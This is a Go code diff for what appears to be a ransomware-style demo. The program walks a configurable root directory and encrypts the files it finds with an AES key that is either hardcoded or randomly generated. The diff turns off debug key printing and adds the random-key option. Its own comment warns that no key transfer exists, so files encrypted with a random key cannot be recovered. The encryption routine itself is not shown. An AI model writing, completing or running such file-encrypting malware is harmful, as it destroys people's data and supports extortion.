@@ -11,26 +11,22 @@ import (
 	"path/filepath"
 )
 
-const DEBUG bool = true
+const DEBUG bool = false
+const RANDOM bool = false // Generated random AES encryption key and encrypts files. Ther's no key transfer module in this version, so be careful using this.
+const ROOT string = "/path/to/root"
 
 var file_paths []string
 
 func main() {
+	key := whatTheKey(RANDOM)
 	// Key Generation
-	key, err := GenerateKey()
-
 	if DEBUG {
 		fmt.Println("Key: ", hex.EncodeToString(key))
 	}
 
-	if err != nil {
-		panic(err)
-	}
-
 	// Path Discovery
-	const root string = "/home/kali/Documents/GoDemo2/test"
-	err2 := filepath.WalkDir(root, visitFile)
-	if err2 != nil {
+	err := filepath.WalkDir(ROOT, visitFile)
+	if err != nil {
 		fmt.Printf("Error walking the path: %v\n", err)
 	}
 
@@ -51,7 +47,15 @@ func main() {
 	}
 
 }
-
+func whatTheKey(isRandom bool) []byte {
+	var key []byte
+	if isRandom {
+		key, _ = GenerateKey()
+	} else {
+		key = []byte("YOUR-32-BIT-KEY-STRING")
+	}
+	return key
+}
 func GenerateKey() ([]byte, error) {
 	key := make([]byte, 32)
 
